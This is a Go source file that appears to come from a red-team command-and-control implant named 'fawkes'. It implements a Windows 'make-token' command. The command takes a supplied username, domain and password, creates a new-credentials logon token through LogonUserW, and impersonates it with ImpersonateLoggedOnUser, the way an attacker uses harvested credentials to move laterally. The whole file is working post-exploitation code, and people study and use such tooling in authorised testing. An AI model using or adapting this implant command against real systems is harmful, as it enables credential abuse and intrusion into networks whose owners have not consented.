//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procLogonUserW = advapi32.NewProc("LogonUserW")
)

const (
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from credentials and impersonate it"
}

type MakeTokenParams struct {
	Username string `json:"username"`
	Domain   string `json:"domain"`
	Password string `json:"password"`
}

func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.Username == "" {
		return structs.CommandResult{
			Output:    "Username is required",
			Status:    "error",
			Completed: true,
		}
	}
	if params.Domain == "" {
		params.Domain = "."
	}
	if params.Password == "" {
		return structs.CommandResult{
			Output:    "Password is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Get current token info for comparison
	currentHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get current process: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var currentToken windows.Token
	err = windows.OpenProcessToken(currentHandle, windows.TOKEN_QUERY, &currentToken)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open current process token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer currentToken.Close()

	currentUser, err := currentToken.GetTokenUser()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get current token user: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	currentUsername, currentDomain, _, err := currentUser.User.Sid.LookupAccount("")
	if err != nil {
		currentUsername = "unknown"
		currentDomain = "unknown"
	}

	output := fmt.Sprintf("[*] Current token: %s\\%s\n", currentDomain, currentUsername)

	// Convert strings to UTF-16
	usernamePtr, err := windows.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := windows.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := windows.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Call LogonUserW to create a new token
	var newTokenHandle windows.Handle
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&newTokenHandle)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[+] Successfully created token for %s\\%s\n", params.Domain, params.Username)

	// Impersonate the new token
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(newTokenHandle))
	if ret == 0 {
		windows.CloseHandle(newTokenHandle)
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += "[+] Successfully impersonated new token\n"

	// Get new token info
	var impersonatedToken windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, false, &impersonatedToken)
	if err != nil {
		output += fmt.Sprintf("[!] Warning: Could not verify impersonation: %v\n", err)
	} else {
		defer impersonatedToken.Close()

		impersonatedUser, err := impersonatedToken.GetTokenUser()
		if err != nil {
			output += fmt.Sprintf("[!] Warning: Could not get impersonated user info: %v\n", err)
		} else {
			impersonatedUsername, impersonatedDomain, _, err := impersonatedUser.User.Sid.LookupAccount("")
			if err != nil {
				impersonatedUsername = "unknown"
				impersonatedDomain = "unknown"
			}
			output += fmt.Sprintf("[*] New token: %s\\%s\n", impersonatedDomain, impersonatedUsername)
		}
	}

	output += "[*] Use 'rev2self' to revert to original token"

	return structs.CommandResult{
		Output:    strings.TrimSpace(output),
		Status:    "success",
		Completed: true,
	}
}
